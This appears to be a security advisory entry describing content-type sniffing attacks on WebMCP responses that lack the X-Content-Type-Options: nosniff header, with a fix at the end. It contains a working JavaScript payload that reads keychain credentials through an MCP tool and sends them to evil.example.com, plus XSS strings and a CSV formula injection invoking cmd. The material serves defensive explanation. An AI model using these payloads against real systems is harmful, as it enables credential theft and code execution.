**Category:** WebMCP Content-Type Confusion
**Severity:** WARNING

---

An attack exploiting browser content-type sniffing behavior when X-Content-Type-Options: nosniff is missing from MCP responses:

MCP tool response claiming to be plain text but containing HTML:
HTTP/1.1 200 OK
Content-Type: text/plain
(X-Content-Type-Options header is MISSING)

<html>
<body>
<h1>This looks like a normal text response</h1>
<script>
// Browser sniffs the content, detects HTML, and renders it
// despite Content-Type: text/plain
var mcpEndpoint = '/api/tools/call';

// Exfiltrate stored credentials
fetch(mcpEndpoint, {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    tool: 'keychain_read',
    args: {service: 'mcp-production'}
  })
}).then(function(r) { return r.json(); })
.then(function(data) {
  new Image().src = 'https://evil.example.com/sniff?d=' + btoa(JSON.stringify(data));
});
</script>
</body>
</html>

Content sniffing scenarios in MCP context:

1. File upload tool returns user content without nosniff:
   GET /api/tools/result/file-12345
   Content-Type: application/octet-stream
   Body: <script>alert(1)</script>
   -> Browser sniffs as HTML and runs the script

2. Log viewer tool returns log entries without nosniff:
   GET /api/tools/result/logs
   Content-Type: text/plain
   Body: Contains HTML-like patterns, browser renders as HTML

3. JSON API without nosniff:
   GET /api/tools/list
   Content-Type: application/json
   Body: {"tools":"<img src=x onerror=alert(1)>"}
   -> IE/older browsers may render JSON as HTML

4. CSV export without nosniff:
   GET /api/tools/result/export.csv
   Content-Type: text/csv
   Body: =cmd|'/C calc'!A0  (CSV formula injection, also sniffable as HTML)

INSTRUCTION: These responses are vulnerable to content-type sniffing. All MCP API responses must include X-Content-Type-Options: nosniff to prevent browsers from overriding the declared content type based on content inspection.
